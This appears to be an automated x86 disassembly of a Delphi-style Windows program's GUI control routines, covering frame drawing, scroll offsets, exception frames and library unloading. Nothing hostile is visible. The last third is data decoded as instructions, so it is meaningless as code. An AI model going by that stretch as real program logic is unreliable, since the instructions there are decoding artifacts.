jmp r-xdata
sub al 0x2
jne r-xdata
inc [ esp + 0x10 ]
inc [ esp + 0x14 ]
sub_42fb04
push ebx
mov ebx eax
mov eax ebx
call sub_43fcb0
mov ax [ ebx + 0x78 ]
cmp ax 0xfff1
je r-xdata
mov al [ ebx + 0x5b ]
dec eax
sub al 0x2
jae r-xdata
cmp ax 0xfff2
jne r-xdata
mov dx 0xfff2
mov eax ebx
call sub_440ab0
mov dx 0xfff1
mov eax ebx
call sub_440ab0
jmp r-xdata
pop ebx
retn
sub_42fb40
push ebx
push esi
add esp 0xffffffe0
mov ebx eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0x14 ]
mov edx [ ebx + 0x70 ]
call sub_423684
lea edx [ esp + 0x10 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea edx [ esp + 0x10 ]
mov eax [ ebx + 0x160 ]
call sub_423a28
cmp [ ebx + 0x16d ] 0x0
je r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
mov al [ ebx + 0x5b ]
add al 0xfd
sub al 0x2
jae r-xdata
cmp [ ebx + 0x1c2 ] 0x0
je r-xdata
mov esi [ ebx + 0x160 ]
mov eax [ esi + 0x10 ]
mov dl 0x2
call sub_423480
mov eax [ esi + 0x10 ]
mov dl 0xe
call sub_423464
mov eax [ esi + 0x10 ]
mov edx 0xffd8ce
call sub_4233a4
mov eax [ esi + 0x14 ]
mov dl 0x1
call sub_4237a0
mov eax ebx
call sub_4402a8
push eax
mov eax ebx
call sub_4402ec
push eax
xor ecx ecx
xor edx edx
mov eax esi
call sub_423b64
push 0xffffffff
push 0x2
lea eax [ esp + 0x8 ]
push eax
call InflateRect
push 0x2
push 0xffffffff
lea eax [ esp + 0x8 ]
push eax
call InflateRect
jmp r-xdata
add esp 0x20
pop esi
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x1c4 ]
call [ ebx + 0x1c0 ]
push 0x1
push 0x1
lea eax [ esp + 0x8 ]
push eax
call OffsetRect
mov eax 0xff000014
call sub_4229f8
push eax
call CreateSolidBrush
mov esi eax
push esi
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x160 ]
call sub_423dcc
push eax
call FrameRect
push esi
call DeleteObject
push 0xfffffffe
push 0xfffffffe
lea eax [ esp + 0x8 ]
push eax
call OffsetRect
mov eax 0xff000010
call sub_4229f8
push eax
call CreateSolidBrush
mov esi eax
push esi
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x160 ]
call sub_423dcc
push eax
call FrameRect
push esi
call DeleteObject
sub_42fc9c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x90 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx [ esi ]
cmp edx [ ebx + 0x188 ]
jg r-xdata
cmp [ ebx + 0x16c ] 0x0
je r-xdata
xor edx edx
mov [ esi ] edx
sub_42fccc
push ebx
push ecx
mov [ esp ] 0x1
cmp [ eax + 0x1b2 ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
push esp
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1b4 ]
call [ ebx + 0x1b0 ]
sub_42fcf8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x2 ] cl
mov [ ebp - 0x1 ] dl
mov ebx eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov cl [ ebp - 0x2 ]
mov dl [ ebp - 0x1 ]
mov eax ebx
call sub_441e6c
cmp [ ebp - 0x1 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax ebx
call sub_42fa18
mov [ ebx + 0x174 ] eax
lea ecx [ ebp - 0xc ]
mov edx [ ebp + 0x8 ]
mov eax [ ebp + 0xc ]
call sub_418d40
mov eax [ ebp - 0xc ]
mov [ ebx + 0x178 ] eax
mov eax [ ebp - 0x8 ]
mov [ ebx + 0x17c ] eax
cmp [ ebx + 0x174 ] 0x0
je r-xdata
mov al [ ebx + 0x5b ]
add al 0xfd
sub al 0x2
jae r-xdata
mov eax [ ebx + 0x30 ]
call sub_4402ec
sub eax [ ebx + 0x188 ]
mov [ ebx + 0x18c ] eax
mov eax [ ebx + 0x30 ]
call sub_443dbc
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebx + 0x30 ]
call sub_4402a8
sub eax [ ebx + 0x188 ]
mov [ ebx + 0x18c ] eax
mov eax [ ebx + 0x30 ]
call sub_443dbc
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebx + 0x174 ]
mov eax [ eax + 0x4c ]
add [ ebx + 0x18c ] eax
inc esi
xor edi edi
mov eax [ ebx + 0x174 ]
mov eax [ eax + 0x48 ]
add [ ebx + 0x18c ] eax
jmp r-xdata
inc esi
xor edi edi
mov al [ ebx + 0x1a8 ]
sub al 0x1
je r-xdata
mov eax ecx
mov [ ebx + 0x168 ] eax
mov edx [ eax + 0x1d8 ]
mov [ ebx + 0x198 ] edx
mov edx [ eax + 0x1dc ]
mov [ ebx + 0x19c ] edx
mov eax [ ebx + 0x168 ]
mov [ eax + 0x1dc ] ebx
mov [ eax + 0x1d8 ] sub_430208
inc edi
dec esi
jne r-xdata
mov eax [ eax + 0x4c ]
sub [ ebx + 0x18c ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0xc ]
mov eax ebx
call sub_4300f4
mov eax ebx
call sub_42f8e8
mov eax ebx
call sub_457700
mov edx eax
mov ecx [ edx + 0x220 ]
test ecx ecx
je r-xdata
inc edi
dec esi
jne r-xdata
mov dl [ eax + 0x5b ]
add dl 0xfd
sub dl 0x2
jae r-xdata
mov eax ebx
call sub_42f964
sub al 0x2
jne r-xdata
mov edx edi
mov eax [ ebx + 0x30 ]
call sub_443d80
mov dl [ eax + 0x5b ]
dec edx
sub dl 0x2
jae r-xdata
mov edx edi
mov eax [ ebx + 0x30 ]
call sub_443d80
cmp [ eax + 0x57 ] 0x0
je r-xdata
mov eax [ eax + 0x48 ]
sub [ ebx + 0x18c ] eax
sub_42fe9c
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x190 ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x1a0 ]
je r-xdata
pop ebx
pop ecx
pop ebp
retn
mov edx [ ebp - 0x4 ]
mov dl [ edx + 0x5b ]
dec dl
je r-xdata
mov edx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x174 ]
call sub_440084
jmp r-xdata
dec dl
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x88 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1ba ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_443924
xor edx edx
push ebp
push sub_42ffd8
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x174 ]
mov edx [ eax + 0x4c ]
mov ecx [ ebp - 0x4 ]
sub edx [ ecx + 0x190 ]
add edx [ eax + 0x44 ]
call sub_440038
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x190 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x174 ]
call sub_440084
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_44392c
retn
dec dl
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x190 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1a0 ] eax
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x1bc ]
call [ ebx + 0x1b8 ]
mov edx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x174 ]
call sub_440060
jmp r-xdata
dec dl
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_443924
xor edx edx
push ebp
push sub_42ff6b
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x174 ]
mov edx [ eax + 0x48 ]
mov ecx [ ebp - 0x4 ]
sub edx [ ecx + 0x190 ]
add edx [ eax + 0x40 ]
call sub_440014
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x190 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x174 ]
call sub_440060
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_44392c
retn
jmp r-xdata
sub_430020
push ebp
mov ebp esp
push ecx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ecx edx
mov esi eax
mov edi [ ebp + 0xc ]
mov dl [ esi + 0x5b ]
mov eax edx
add al 0xfd
sub al 0x2
jae r-xdata
mov eax [ ebp - 0x4 ]
sub eax [ esi + 0x17c ]
mov ecx [ ebp + 0x8 ]
mov [ ecx ] eax
sub ecx [ esi + 0x178 ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
jmp r-xdata
mov eax [ esi + 0x174 ]
mov eax [ eax + 0x4c ]
mov ecx [ ebp + 0x8 ]
add eax [ ecx ]
jmp r-xdata
dec cl
je r-xdata
xor eax eax
mov ecx edx
dec cl
je r-xdata
mov [ edi ] eax
cmp eax [ esi + 0x188 ]
jge r-xdata
mov eax [ esi + 0x174 ]
mov eax [ eax + 0x4c ]
mov ecx [ ebp + 0x8 ]
sub eax [ ecx ]
dec cl
je r-xdata
cmp eax [ esi + 0x18c ]
jle r-xdata
mov ecx [ esi + 0x188 ]
mov [ edi ] ecx
jmp r-xdata
mov eax [ esi + 0x174 ]
mov eax [ eax + 0x48 ]
mov ecx [ ebp + 0x8 ]
add eax [ ecx ]
jmp r-xdata
dec cl
je r-xdata
cmp eax [ edi ]
je r-xdata
mov ecx [ esi + 0x18c ]
mov [ edi ] ecx
mov eax [ esi + 0x174 ]
mov eax [ eax + 0x48 ]
mov ecx [ ebp + 0x8 ]
sub eax [ ecx ]
jmp r-xdata
jmp r-xdata
pop edi
pop esi
pop ecx
pop ebp
retn 0x8
sub dl 0x2
je r-xdata
sub eax [ edi ]
jmp r-xdata
sub dl 0x2
jne r-xdata
mov edx [ ebp + 0x8 ]
add [ edx ] eax
mov edx [ edi ]
sub edx eax
mov eax edx
sub_43010c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov edi [ ebp + 0x8 ]
push edi
mov ecx esi
mov dl [ ebp - 0x1 ]
mov eax ebx
call sub_442124
test [ ebp - 0x1 ] 0x8
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp [ ebx + 0x174 ] 0x0
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0xc ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_430020
lea edx [ ebp - 0x8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x94 ]
test al al
je r-xdata
mov al [ ebx + 0x1a8 ]
sub al 0x1
je r-xdata
mov eax ebx
call sub_42f964
sub al 0x2
jne r-xdata
mov al [ ebx + 0x1a8 ]
sub al 0x1
je r-xdata
mov eax ebx
call sub_42fe9c
mov eax [ ebp - 0x8 ]
mov [ ebx + 0x190 ] eax
mov eax [ ebp - 0xc ]
mov [ ebx + 0x1ac ] eax
cmp [ ebx + 0x1a8 ] 0x2
jne r-xdata
mov eax ebx
call sub_42f964
sub al 0x2
jne r-xdata
sub_4301b4
push ebp
mov ebp esp
push ecx
push esi
mov [ ebp - 0x1 ] cl
mov esi eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov cl [ ebp - 0x1 ]
mov eax esi
call sub_4421cc
cmp [ esi + 0x174 ] 0x0
je r-xdata
pop esi
pop ecx
pop ebp
retn 0x8
mov al [ esi + 0x1a8 ]
sub al 0x1
je r-xdata
mov eax esi
call sub_42f964
sub al 0x2
jne r-xdata
mov eax esi
call sub_42fe9c
mov eax esi
mov si 0xffc7
call sub_403418
sub_430208
push ebp
mov ebp esp
push esi
mov esi eax
cmp [ ecx ] 0x1b
jne r-xdata
cmp [ esi + 0x19a ] 0x0
je r-xdata
mov eax esi
mov si 0xffc7
call sub_403418
jmp r-xdata
pop esi
pop ebp
retn 0x4
mov al [ ebp + 0x8 ]
push eax
mov eax [ esi + 0x19c ]
call [ esi + 0x198 ]
sub_430250
push ebx
mov ebx eax
cmp [ ebx + 0x174 ] 0x0
je r-xdata
cmp [ ebx + 0x1ba ] 0x0
je r-xdata
cmp [ ebx + 0x184 ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x1bc ]
call [ ebx + 0x1b8 ]
xor eax eax
mov [ ebx + 0x174 ] eax
mov eax ebx
call sub_42f9d0
mov eax [ ebx + 0x168 ]
test eax eax
je r-xdata
mov eax ebx
call sub_42f964
mov edx [ ebx + 0x198 ]
mov [ eax + 0x1d8 ] edx
mov edx [ ebx + 0x19c ]
mov [ eax + 0x1dc ] edx
xor eax eax
mov [ ebx + 0x168 ] eax
sub_43062c
push 0xf8004776
inc [ eax ]
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_430659
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_430660
retn
sub_43066c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_43069d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4306a4
retn
mov eax [ rw-data ]
call sub_40321c
sub_430754
or al [ eax ]
add [ eax ] al
cli
inc esi
add [ eax ] dh
inc di
add [ eax ] al
add [ eax ] al
add [ eax - 0x6 ] ah
inc esi
add al cl
inc edi
add [ eax ] al
add [ eax ] al
add [ edx + edi * 8 + 0x46 ] bl
add [ eax + 0x64 ] bl
inc edi
add [ eax ] al
add [ eax ] al
add [ eax - 0x6 ] bl
inc esi
add [ ebp + 0x47 ] ch
add [ eax ] al
add [ eax ] al
add [ edx + edi * 8 + 0x46 ] dl
add [ esi + 0x47 ] ch
add [ eax ] al
add [ eax ] al
add [ eax - 0x6 ] dl
inc esi
add [ eax + 0x4768 ] bh
add [ eax ] al
add [ edx + edi * 8 + 0x46 ] cl
add [ eax + 0x4766 ] ch
add [ eax ] al
add [ eax - 0x6 ] cl
inc esi
add [ edi ] bh
inc edi
add [ eax ] al
add [ eax ] al
add [ edx + edi * 8 + 0x46 ] al
add [ eax + ebp * 2 + 0x47 ] dl
add [ eax ] al
inc eax
cli
inc esi
add [ esp + 0x47 ] bh
add [ eax ] al
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_4307fc
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_430803
retn
call sub_430738
sub_430830
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_430855
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43085c
retn
sub_430877
inc [ ecx ]
add [ eax ] al
add [ ecx ] dh
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_4308bc
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4308c3
retn
mov eax rw-data
mov ecx 0x2
mov edx [ r-xdata ]
call sub_404a20
sub_4308df
inc [ ecx ]
add [ eax ] al
add [ ecx ] dh
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_430924
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43092b
retn
mov eax rw-data
mov ecx 0x2
mov edx [ r-xdata ]
call sub_404a20
sub_43093b
dec [ edx ]
add [ eax ] al
add [ ebp + 0x41 ] cl
push eax
dec ecx
xor esi [ edx ]
inc esp
dec esp
dec esp
add [ eax ] al
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_430991
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_430998
retn
cmp [ rw-data ] 0x0
je r-xdata
mov eax rw-data
call sub_403f6c
mov eax [ rw-data ]
push eax
call FreeLibrary
sub_4309a4
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4309e8
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4309ef
retn
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
push eax
call FreeLibrary
sub_4309fc
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_430a21
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_430a28
retn
sub_430a98
push cs
adc [ ebx + eax * 2 + 0x6f ] edx
outsb
jbe r-xdata
outsb
jb r-xdata
outsd
insd
inc ebx
je r-xdata
je r-xdata
clc
imul ebp [ edi + 0x6e ] 0x6d726f46
popad
je r-xdata
outsb
or dl [ ebp + edx * 2 + 0x44 ]
insb
add [ ebx ] al
adc [ ebp + edx * 2 + 0x70 ] dl
inc esp
or al [ ebx ]
or al 0x75
dec eax
outsd
jb r-xdata
outsd
outsb
add [ eax ] eax
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add al bh
add [ eax ] al
add al [ eax ]
add [ eax ] al
jo r-xdata
jpe r-xdata
add [ eax ] al
add [ eax + r-xdata ] dl
add ecx [ esi ]
push esp
push ebp
inc esp
inc ecx
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add ah cl
adc [ eax ] al
add al 0x0
add [ eax ] al
nop
ror [ edx ] 0x43
add [ ebx ] al
push cs
inc ebp
push esp
jns r-xdata
inc edx
je r-xdata
or eax [ ebx ]
add edx [ eax ]
push esp
push ebp
jo r-xdata
add [ gs : ecx + edx + 0x40 ] bl
add [ ebx + ecx ] bh
inc ebx
add [ ebp + 0xbfc0040 ] cl
inc ebx
add [ eax ] cl
adc [ ebp + edx * 2 + 0x44 ] dl
inc ebx
push 0x69676e61
outsb
inc ebp
jbe r-xdata
inc esp
imul esi [ edx + 0x65 ] 0x6f697463
outsb
jne r-xdata
inc ebx
add [ edi ] al
jne r-xdata
outsb
je r-xdata
or [ ebx + 0x6f ] al
jne r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
insb
imul esp [ ebx + 0x6b ] 0x6e657645
je r-xdata
outsd
ja r-xdata
inc ebx
outsb
je r-xdata
imul ebp [ esi + 0x67 ] 0x6e657645
dec esi
outsd
outsb
add eax 0x55647075
add [ edx ] al
or [ esi ] al
jo r-xdata
push ebp
add [ eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax + 0xb ] dh
insb
or dh [ ebp + 0x64 ]
push esi
jb r-xdata
jbe r-xdata
insb
add [ gs : eax ] eax
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ ebx + ecx ] bh
inc ebx
add [ esi ] al
bound esi [ esi + ecx * 2 + 0x65 ]
js r-xdata
insd
inc ebx
je r-xdata
push edx
imul esp [ edi + 0x68 ] 0x6f430874
add [ ebx ] ecx
inc ecx
insb
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0xb ] si
add cl [ eax ]
push es
push ebx
outsb
jb r-xdata
add ah dl
or eax 0xe000043
inc ebx
add [ eax + 0x2 ] al
add [ eax ] al
jo r-xdata
popad
insb
jne r-xdata
push ebx
outsb
add cl [ eax ]
push es
or [ ebx + 0x6f ] al
jne r-xdata
add [ ebx ] ecx
inc ecx
insb
insb
outsd
ja r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0xb ] si
pop es
imul esp [ ebx + 0x61 ] 0x6f43086c
insd
inc ebx
je r-xdata
je r-xdata
inc ebx
add [ esp + edx ] cl
inc ebx
add [ ebx ] cl
push esp
inc ebx
outsd
outsb
jbe r-xdata
inc eax
add ah bh
or al [ ebx ]
add ecx [ esi ]
push esp
push ebp
inc esp
dec edi
jb r-xdata
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x6 ] si
push es
bound esi [ eax + edx * 2 + 0x72 ]
inc eax
add [ eax + edx ] bh
push 0x65676e61
pop es
inc edx
outsd
outsd
insb
popad
outsb
add [ eax ] cl
dec esi
ja r-xdata
inc edx
jne r-xdata
add [ esi ] al
push esp
dec edi
add [ eax ] dl
inc ebx
add [ edx + eax + 0x34700042 ] ch
inc eax
add [ eax ] al
cld
inc ecx
add [ eax + 0x34 ] bh
inc eax
add [ esp + ecx * 2 ] al
inc edx
add [ eax + 0x34 ] dh
or [ ebx + 0x6d ] dl
popad
insb
insb
imul ebp [ esi + 0x74 ] 0x69440900
jb r-xdata
insb
jae r-xdata
jb r-xdata
outsb
inc esp
outsd
ja r-xdata
insb
outsd
ja r-xdata
or eax [ ecx + 0x6c ]
push 0x65676e61
pop es
inc edx
outsd
outsd
insb
popad
outsb
add [ ecx + edx + 0x40 ] bl
add [ eax ] al
adc [ eax ] al
mov eax eax
inc esp
or al 0x43
add [ eax ] cl
adc dl [ ebp + edx * 2 + 0x44 ]
inc ebx
push 0x69676e61
insd
inc ebx
je r-xdata
inc ebx
outsd
insb
jae r-xdata
inc ebx
jae r-xdata
jb r-xdata
jb r-xdata
je r-xdata
outsb
jbe r-xdata
je r-xdata
add [ esi + ebp * 2 + 0x44 ] ch
add ah cl
inc ebx
inc esp
inc esp
add [ ecx + esi + 0x31d00040 ] dh
inc eax
add ah bl
inc esp
add ah bl
jpo r-xdata
dec esp
arpl [ ecx + ebp * 2 + 0x6f ] si
inc ebx
sar [ eax + 0x800430b ] 0xd
push esp
jb r-xdata
inc eax
add [ eax + 0xb ] dh
inc ebx
add [ eax + r-xdata ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc al 0xe
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
outsb
je r-xdata
insb
imul esp [ edi + 0x6e ] 0x74747542
outsd
outsb
add [ eax ] eax
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ edx + ecx + 0x75060043 ] bh
dec esp
je r-xdata
add [ ebx ] al
or dl [ ebp + edx * 2 + 0x44 ]
inc edx
je r-xdata
rol [ eax + 0xb ] 0x43
imul ebp [ edi + 0x6e ] sub_430a98
jae r-xdata
outsb
inc ebp
insd
push ebp
jo r-xdata
add [ eax + 0x4e ] dh
inc esp
add [ edx + eax * 4 + 0x6d1c0044 ] ch
inc esp
add [ eax + esi * 2 + 0x44 ] al
add [ edi ] al
add [ esi ] bh
mov al 0x4e
mov esp 0x5bd14
adc eax 0xb2ffb3bd
push esp
pop ss
inc ebx
add [ eax ] dl
sbb [ ebx ] al
loopne r-xdata
sub eax [ eax + eax - 0x8 ]
outsb
inc esp
add [ edi + ebp * 2 + 0x6a780044 ] dh
inc esp
add [ eax - 0x7ffbb91 ] bl
xor [ eax + eax - 0x74 ] al
aaa
inc esp
add [ eax * 2 + 0x14ec0044 ] ch
inc ebx
add [ edx + eax * 2 ] dl
inc esp
add [ eax - 0x3bffbceb ] al
inc ebp
inc esp
add al cl
inc ebp
inc esp
add [ eax + 0x28004444 ] al
inc esp
inc esp
add al bl
jo r-xdata
add al ah
add [ eax ] dh
sti
inc ebx
add [ ebx + edi * 8 ] dh
inc ebx
add [ eax ] dh
sub eax [ eax + eax + 0x5c ]
sub eax [ eax + eax + 0x74 ]
push es
inc esp
add [ esp + edi * 8 + 0x8000043 ] ch
inc esp
add [ eax + 0x7 ] bh
inc esp
add [ edx + ecx + 0x9380044 ] cl
inc esp
add [ eax - 0x1fffbbb6 ] ah
add [ esp + edi * 2 ] cl
inc esp
add [ eax + 0x7b ] bl
inc esp
add al ch
sti
inc ebx
add [ ecx + esi * 2 + 0x44 ] ch
add [ ecx + esi * 2 + 0x6e6c0044 ] cl
inc esp
add [ eax - 0x59 ] al
inc ecx
add [ eax + 0x29 ] ah
inc esp
add al bh
sbb al [ ebx ]
xor [ eax ] 0x44
add [ esi + eax + 0x2c40044 ] cl
inc edx
add [ edi + edi * 8 - 0x5bffbf ] ch
inc ecx
add ah cl
add al [ edx ]
and [ ebx + eax * 2 ] dl
add al dh
jbe r-xdata
inc esp
imul esi [ edx + 0x65 ] 0x6f697463
outsb
add [ ecx + edx + 0x40 ] bl
add [ eax ] al
adc [ eax ] al
cmp al 0x10
inc ebx
add [ eax ] cl
or eax 0x43445554
push esp
jns r-xdata
outsb
adc [ ebp + edx * 2 + 0x70 ] dl
inc esp
outsd
ja r-xdata
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + ecx + 0x43 ] cl
add [ eax + 0x2 ] al
add [ eax ] al
ror [ ebx + eax * 2 ] 0x0
outsd
ja r-xdata
jae r-xdata
inc ebx
add [ eax + 0x58004316 ] dh
push ss
inc ebx
add [ edi + edx + 0x43 ] dl
add [ eax + 0x18 ] cl
inc ebx
add [ 0x73754354 ] cl
je r-xdata
push ebp
inc esp
inc ebx
inc esp
add ah al
add al [ edx ]
lodsb [ esi ]
inc [ ecx ]
movsb [ edi ] [ esi ]
inc [ ecx ]
int3
inc eax
add [ eax ] al
cld
inc ecx
add [ eax + 0x34 ] bh
inc eax
add [ esp + ecx * 2 ] al
inc eax
add ah bl
inc esp
shl [ ecx ] 0x1
mov eax eax
adc al 0xe
inc ebx
add [ edi ] al
or eax 0x73754354
je r-xdata
add ah bl
jpo r-xdata
inc eax
add al dl
xor [ eax ] eax
fsubr [ esi ]
inc esp
outsd
inc esp
add [ ecx + esi + 0x31d00040 ] dh
add [ esi + ebp * 2 + 0x44 ] ch
add ah cl
inc ebx
inc esp
add [ eax - 0x59 ] al
inc ecx
add [ eax + 0x29 ] ah
inc esp
add al bh
insd
push ebp
jo r-xdata
sbb eax 0x10043
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
add [ eax + 0x4e ] dh
inc esp
add [ edx + eax * 4 + 0x6d1c0044 ] ch
inc esp
add [ eax + esi * 2 + 0x44 ] al
add [ edi ] al
push esp
push ebp
jo r-xdata
sub eax [ eax + eax - 0x8 ]
outsb
inc esp
add [ edi + ebp * 2 + 0x6a780044 ] dh
inc esp
add [ eax - 0x7ffbb91 ] bl
xor [ eax + eax - 0x74 ] al
aaa
inc esp
add [ eax * 2 + 0x14ec0044 ] ch
inc ebx
add [ edx + eax * 2 ] dl
inc esp
add [ eax - 0x3bffbceb ] al
inc ebp
inc esp
add al cl
inc ebp
inc esp
add [ eax + 0x28004444 ] al
inc esp
inc esp
add al bl
jo r-xdata
add al ah
add [ eax ] dh
sti
inc ebx
add [ ebx + edi * 8 ] dh
inc ebx
add [ eax ] dh
sub eax [ eax + eax + 0x5c ]
sub eax [ eax + eax + 0x74 ]
push es
inc esp
add [ esp + edi * 8 + 0x8000043 ] ch
inc esp
add [ eax + 0x7 ] bh
inc esp
add [ edx + ecx + 0x9380044 ] cl
inc esp
add [ eax - 0x1fffbbb6 ] ah
add [ esp + edi * 2 ] cl
inc esp
add [ eax + 0x7b ] bl
inc esp
add al ch
sti
inc ebx
add [ ecx + esi * 2 + 0x44 ] ch
add [ ecx + esi * 2 + 0x6e6c0044 ] cl
inc esp
lodsb [ esi ]
add al [ edx ]
jo r-xdata
outsd
ja r-xdata
add [ eax ] al
jmp eax
and al 0xcd
inc ebx
add [ edx + eax ] cl
outsb
inc edx
jne r-xdata
outsd
ja r-xdata
sbb al [ ebx ]
xor [ eax ] 0x44
add [ esi + eax + 0x2c40044 ] cl
inc edx
add [ edi + edi * 8 - 0x5bffbf ] ch
inc ecx
add ah cl
add al [ edx ]
and [ ebx + eax * 2 ] dl
sub [ eax + eax - 0x8 ] eax
or al 0xd
inc ebx
add [ ecx * 8 + 0xb0043 ] ah
or [ ebx + 0x6f ] al
insd
inc ebx
je r-xdata
add al [ eax ]
inc [ eax + 0x100431b ]
arpl [ ecx + 0x61 ] bp
je r-xdata
je r-xdata
add bh bh
cwde
sbb [ ebx ] al
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
or eax 0x73410900
jae r-xdata
or al 0x2
pop eax
cmovae eax [ eax ]
pop es
pop es
push esp
push ebp
jo r-xdata
add al dh
jbe r-xdata
inc ecx
add [ edi + edi * 8 + 0x2cc0041 ] ah
inc edx
add [ eax ] ah
adc al 0x43
insb
jae r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] al
adc al 0x2
add bh bh
adc [ ebx + eax * 2 ] bl
add [ ecx ] al
add [ eax ] al
